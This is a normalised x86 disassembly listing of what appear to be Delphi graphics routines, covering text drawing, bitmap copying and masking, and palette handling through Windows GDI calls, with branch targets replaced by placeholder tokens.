or edi 0x2
push 0x0
mov eax esi
call sub_404334
push eax
mov eax esi
call sub_404534
push eax
lea eax [ ebp - 0x14 ]
push eax
push edi
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call ExtTextOutA
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax ebx
call sub_41e184
cmp al 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_41e320
inc eax
add [ ebp - 0x4 ] eax
sub_41e2dc
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41e5b8
xor eax eax
mov [ esi ] eax
xor eax eax
mov [ esi + 0x4 ] eax
push esi
mov eax edi
call sub_404334
push eax
mov eax edi
call sub_404534
push eax
mov eax [ ebx + 0x4 ]
push eax
call GetTextExtentPoint32A
pop edi
pop esi
pop ebx
retn
sub_41e320
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_41e2dc
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_41e33c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_41e2dc
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_41e35c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_41e3a8
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x50 ] 0x0
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e3af
push rw-data
call LeaveCriticalSection
retn
mov eax ebx
call sub_41e074
sub_41e408
push ebx
push esi
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41e5b8
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetCurrentPositionEx
pop esi
pop ebx
retn
sub_41e42c
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
call sub_41e09c
pop ecx
pop edx
pop edi
pop esi
retn
sub_41e44c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41e5b8
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetPixel
pop edi
pop esi
pop ebx
retn
sub_41e478
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41e5b8
mov eax [ ebp + 0x8 ]
call sub_41cf40
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call SetPixel
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_41e4c0
push ebx
push esi
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41e5b8
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetClipBox
pop esi
pop ebx
retn
sub_41e504
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov dl [ ebx + 0x8 ]
cmp dl al
je r-xdata
mov eax [ rw-data ]
push eax
push esi
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov [ ebx + 0x8 ] al
sub_41e564
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov eax ebx
call sub_41e504
mov edx esp
mov eax ebx
call sub_41e408
mov eax [ esp ]
mov [ ebx + 0x18 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
and [ ebx + 0x8 ] 0xfe
or [ ebx + 0x8 ] 0x1
mov [ ebx + 0x4 ] esi
lea edx [ ebx + 0x18 ]
mov eax ebx
call sub_41e42c
sub_41e5b8
push ebx
push esi
push ecx
mov [ esp ] dl
mov esi eax
mov bl [ esi + 0x8 ]
not ebx
and bl [ esp ]
mov al [ r-xdata ]
cmp al bl
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl 0x1
je r-xdata
test bl 0x2
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
test bl 0x4
je r-xdata
mov eax esi
call sub_41e654
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_403a2c
test bl 0x8
je r-xdata
mov eax esi
call sub_41e680
or bl [ esi + 0x8 ]
mov [ esi + 0x8 ] bl
mov eax esi
call sub_41e6b0
sub_41e654
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
call sub_41d414
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41cf40
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
pop ebx
retn
sub_41e680
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_41d914
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x10 ]
movzx eax [ eax + 0x18 ]
movzx eax [ eax * 2 + rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetROP2
pop ebx
retn
sub_41e6b0
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
call sub_41dc20
push eax
call UnrealizeObject
mov eax [ ebx + 0x14 ]
call sub_41dc20
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x14 ]
call sub_41dd00
test al al
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_41dbe4
call sub_41cf40
not eax
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x1
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_41dbe4
call sub_41cf40
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x2
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
sub_41e7e0
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_41e82a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e831
lea eax [ ebp - 0x4 ]
call sub_404074
retn
sub_41e834
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
push ebp
push sub_41e8d0
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
call sub_41e7e0
push 0x0
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push 0x400
push ebx
push 0x0
push 0x1000
call FormatMessageA
test eax eax
je r-xdata
lea eax [ ebp - 0x104 ]
lea edx [ ebp - 0x100 ]
mov ecx 0x100
call sub_4042e4
mov ecx [ ebp - 0x104 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e8d7
lea eax [ ebp - 0x104 ]
call sub_404074
retn
sub_41e8ec
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x18 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_41ea3a
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x34 ]
push eax
push 0x18
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
test bl bl
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateBitmap
mov [ ebp - 0x10 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_41e9a9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call CreateCompatibleBitmap
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
call sub_41e834
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
push eax
push 0x0
call ReleaseDC
retn
call sub_41e834
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ea41
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov ebx eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov esi eax
push 0xcc0020
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x30 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call StretchBlt
test ebx ebx
je r-xdata
test esi esi
je r-xdata
push ebx
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
push esi
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
sub_41ea4c
mov edx eax
dec dx
je r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
retn
sub dx 0x3
je r-xdata
sub dx 0x4
jne r-xdata
xor eax eax
retn
sub_41ea80
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x14 ]
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0x9 ] 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
xor eax eax
mov [ ebp - 0x24 ] eax
push 0x0
call CreateCompatibleDC
call sub_41e8dc
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_41ed00
push [ fs : eax ]
mov [ fs : eax ] esp
push esi
push ebx
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_41e8dc
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
push 0x0
mov eax [ rw-data ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
cmp [ ebp - 0x24 ] 0x0
je r-xdata
cmp ebx [ ebp + 0x2c ]
jne r-xdata
push 0xffffffff
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0xffffffff
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
jmp r-xdata
cmp esi [ ebp + 0x28 ]
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ed07
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push 0xcc0020
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push r-xdata
push esi
push ebx
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push 0x0
push edi
call SetTextColor
mov [ ebp - 0x1c ] eax
push 0xffffff
push edi
call SetBkColor
mov [ ebp - 0x20 ] eax
push 0x8800c6
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
push 0x660046
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
mov eax [ ebp - 0x1c ]
push eax
push edi
call SetTextColor
mov eax [ ebp - 0x20 ]
push eax
push edi
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_41e8dc
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_41eb53
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0xcc0020
mov eax 0xaa0029
call sub_406ae4
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call MaskBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ed07
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
sub_41ed14
push ebx
push esi
push edi
mov esi eax
mov edi esi
mov edx 0xff
lea eax [ edi + edx * 4 ]
lea ecx [ edx + edx * 2 ]
lea ecx [ esi + ecx ]
mov bl [ ecx + 0x2 ]
mov [ eax + 0x2 ] bl
mov bl [ ecx + 0x1 ]
mov [ eax + 0x1 ] bl
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
dec edx
test edx edx
jne r-xdata
mov [ edi + 0x3 ] 0x0
pop edi
pop esi
pop ebx
retn
sub_41ed4c
push ebx
push esi
push edi
add esp 0xfffffff8
mov [ esp ] edx
mov esi eax
mov [ esp + 0x4 ] esi
mov edi [ esp ]
mov edi [ edi ]
dec edi
test edi edi
jle r-xdata
mov eax [ esp ]
cmp [ eax ] 0x100
jge r-xdata
mov ecx 0x1
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov edx 0x100
sub edx [ eax ]
lea edx [ edx + edx * 2 ]
mov eax [ esp ]
mov eax [ eax ]
lea eax [ eax + eax * 2 ]
lea eax [ esi + eax ]
xor ecx ecx
call sub_402cbc
mov eax [ esp ]
mov [ eax ] 0x100
mov eax [ esp + 0x4 ]
lea eax [ eax + ecx * 4 ]
lea edx [ ecx + ecx * 2 ]
lea edx [ esi + edx ]
mov bl [ eax + 0x2 ]
mov [ edx + 0x2 ] bl
mov bl [ eax + 0x1 ]
mov [ edx + 0x1 ] bl
mov al [ eax ]
mov [ edx ] al
inc ecx
dec edi
jne r-xdata
sub_41edc4
push ebp
mov ebp esp
add esp 0xffffffd4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x2c ]
push eax
call GetSystemInfo
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
dec ecx
js r-xdata
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x2c ]
cmp [ eax + 0x20 ] 0x3
je r-xdata
push ebx
mov eax [ edx + ecx * 4 ]
bswap eax
shr eax 0x8
mov [ edx + ecx * 4 ] eax
dec ecx
jns r-xdata
xor ebx ebx
mov eax [ edx + ecx * 4 ]
mov bh al
mov bl ah
shr eax 0x10
shl ebx 0x8
mov bl al
mov [ edx + ecx * 4 ] ebx
dec ecx
jns r-xdata
pop ebx
jmp r-xdata
sub_41ee1c
push ebp
mov ebp esp
add esp 0xfffffbf8
push ebx
mov [ ebp - 0x408 ] 0x300
mov [ ebp - 0x406 ] 0x10
lea edx [ ebp - 0x404 ]
mov ecx 0x40
call sub_4028c8
push 0x0
call GetDC
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41ef19
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x68
mov eax [ ebp - 0x4 ]
push eax
call GetDeviceCaps
mov ebx eax
cmp ebx 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ef20
mov eax [ ebp - 0x4 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebp - 0x404 ]
push eax
push 0x8
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
cmp [ ebp - 0x3e8 ] 0xc0c0c0
jne r-xdata
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x424 ]
push eax
push 0x8
sub ebx 0x8
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e8 ]
push eax
push 0x1
mov eax ebx
sub eax 0x8
push eax
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x420 ]
push eax
push 0x7
sub ebx 0x7
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e4 ]
push eax
push 0x1
push 0x7
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
jmp r-xdata
sub_41ef34
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_41efba
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x68
mov eax [ ebp - 0x8 ]
push eax
call GetDeviceCaps
cmp eax 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebx + 0x4 ]
push eax
push 0x8
push 0x0
mov eax [ rw-data ]
push eax
call GetPaletteEntries
movzx eax [ ebx + 0x2 ]
lea eax [ ebx + eax * 4 - 0x1c ]
push eax
push 0x8
push 0x8
mov eax [ rw-data ]
push eax
call GetPaletteEntries
mov [ ebp - 0x1 ] 0x1
sub_41efcc
push ebx
push esi
push edi
add esp 0xfffffbfc
mov edi eax
xor esi esi
mov [ esp ] 0x300
test edi edi
je r-xdata
mov [ esp + 0x2 ] cx
mov eax edx
lea edx [ esp + 0x4 ]
shl ecx 0x2
call sub_4028c8
push 0x0
call CreateCompatibleDC
mov ebx eax
push edi
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x4 ]
push eax
push 0x100
push 0x0
push ebx
call GetDIBColorTable
mov [ esp + 0x2 ] ax
push edi
push ebx
call SelectObject
push ebx
call DeleteDC
jmp r-xdata
mov eax esi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2 ] 0x10
jne r-xdata
cmp [ esp + 0x2 ] 0x0
je r-xdata
movzx edx [ esp + 0x2 ]
lea eax [ esp + 0x4 ]
call sub_41edc4
mov eax esp
call sub_41ef34
test al al
jne r-xdata
mov eax esp
push eax
call CreatePalette
mov esi eax
sub_41f070
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ esp ] eax
test ebx ebx
je r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
lea eax [ edi + 0x1 ]
cmp eax [ esp ]
jge r-xdata
push esi
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
mov eax esi
mov edx [ esp ]
call sub_41edc4
mov [ esp ] eax
sub_41f0c4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
shr [ eax + 0x8 ] 0x1
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0xe ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_41ea6c
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0xe ]
call sub_41ea4c
mov esi eax
push 0x0
call GetDC
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_41f270
push [ fs : edx ]
mov [ fs : edx ] esp
mov edi [ ebp - 0x4 ]
mov eax edi
add eax 0x28
mov edx esi
shl edx 0x2
add eax edx
mov [ ebp - 0x14 ] eax
push 0x0
mov eax [ ebp - 0x4 ]
push edi
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_41e8dc
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41f196
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_41e8ec
mov [ ebx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f19d
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
call sub_41e7e0
sub_41f19d
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
add [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov bx 0x1
mov [ eax + 0xe ] bx
mov eax [ ebp - 0x4 ]
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_41ea6c
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x20 ] 0x2
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24 ] 0x2
mov eax [ ebp - 0x4 ]
add eax 0x28
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] 0xffffff
push 0x0
mov ebx [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_41e8dc
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41f250
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0xc ]
call sub_41e8ec
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f257
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
sub_41f28c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor ecx ecx
mov cl [ edx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
sub ecx eax
xor ebx ebx
mov bl [ edx + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub ebx [ edx + 0x4 ]
mov esi [ ebp - 0x4 ]
movzx esi [ esi ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub esi eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov edi eax
mov eax esi
cdq
xor eax edx
sub eax edx
cmp edi eax
jg r-xdata
xor eax eax
jmp r-xdata
test ecx ecx
jle r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
cdq
xor eax edx
sub eax edx
mov ecx eax
mov eax [ ebp - 0x8 ]
cdq
xor eax edx
sub eax edx
cmp ecx eax
jg r-xdata
cmp esi ecx
jl r-xdata
test ebx ebx
jle r-xdata
mov al 0x1
cmp ebx [ ebp - 0x8 ]
jle r-xdata
sub_41f31c
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0xc ]
mov eax [ ebp - 0xc ]
shl eax 0x4
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
call sub_407c78
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_41f613
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebx ]
or eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
mov [ eax ] edx
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
push 0xb
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
push 0xc
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
xor edx edx
push ebp
push sub_41f405
push [ fs : edx ]
mov [ fs : edx ] esp
push 0xe
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xc
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax ebx
cmp ax 0x8
jbe r-xdata
call sub_41e7e0
push 0x0
call GetDC
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f40c
mov eax [ ebp - 0x28 ]
push eax
push 0x0
call ReleaseDC
retn
sub_41f40c
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x10 ]
movzx eax [ eax + 0x2 ]
call sub_41f280
mov [ ebp - 0x20 ] eax
mov edi [ ebp - 0xc ]
dec edi
test edi edi
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax eax
mov edx [ ebp - 0x10 ]
lea eax [ edx + eax * 8 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x40 ]
mov eax [ eax + 0x8 ]
call sub_407c78
mov [ ebp - 0x2c ] eax
xor eax eax
push ebp
push sub_41f5f3
push [ fs : eax ]
mov [ fs : eax ] esp
